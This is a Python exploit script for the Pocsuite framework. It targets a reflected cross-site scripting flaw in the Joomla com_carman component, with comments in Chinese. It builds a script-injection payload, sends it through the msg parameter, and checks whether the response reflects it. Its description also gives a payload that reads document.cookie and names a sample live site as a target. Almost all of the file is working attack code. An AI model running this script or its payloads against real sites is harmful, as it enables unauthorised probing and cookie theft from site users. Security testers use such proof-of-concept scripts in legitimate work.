#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '18676'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2009-12-24'
    createDate = '2016-01-21'
    updateDate = '2016-01-21'
    references = ['http://www.sebug.net/vuldb/ssvid-18676']
    name = 'Joomla Component com_carman Cross Site Scripting Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla!'
    appVersion = 'N/A'
    vulType = 'XSS'
    desc = '''
        Joomla组件com_carman由于参数msg过滤不严格，导致出现反射性XSS漏洞。
        
        该漏洞利用的POC格式如下：
        http://XXX/index.php?option=com_carman&msg="><script>alert(document.cookie)</script>

        该漏洞在Firefox浏览器下利用与验证的效果截图如下所示：
        （1）http://pan.baidu.com/s/1c0OnfWk
        （2）http://pan.baidu.com/s/1skl3ifb
    '''
    samples = ['http://carrentalsltd.com']

    def _attack(self):
        return self._verify()

    def _verify(self):
        #验证漏洞
        result = {}
        #特征字符串
        strxss="<0x!Q_az*^~>"
        #构造XSS验证的payload
        payload='"><script>alert(/'+strxss+'/)</script>'
        #漏洞访问地址
        exploit='/index.php?option=com_carman&msg='
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive',
          "Content-Type": "application/x-www-form-urlencoded"
        }
        #构造访问地址
        vulurl=self.url+exploit+payload
        #访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #判断返回结果
        if resp.status_code==200 and '<script>alert(/'+strxss+'/)</script>' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] =self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)